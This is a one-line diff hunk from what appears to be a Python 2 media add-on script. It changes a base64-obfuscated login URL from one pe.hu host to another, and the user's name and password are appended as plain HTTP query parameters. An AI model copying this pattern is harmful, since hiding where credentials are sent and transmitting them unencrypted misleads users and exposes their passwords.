@@ -2517,7 +2517,7 @@ except:
     pass
 
 params=get_params()
-Base = 'aHR0cDovL2Ftb2JveHdpemFyZC5wZS5odS9maWxlNC5waHA/dXNlcj0='.decode('base64')+USER+'JnBhc3M9'.decode('base64')+PASS
+Base = 'aHR0cDovL3BzeWNoby5wZS5odS9maWxlNC5waHA/dXNlcj0='.decode('base64')+USER+'JnBhc3M9'.decode('base64')+PASS
 url=None
 name=None
 mode=None
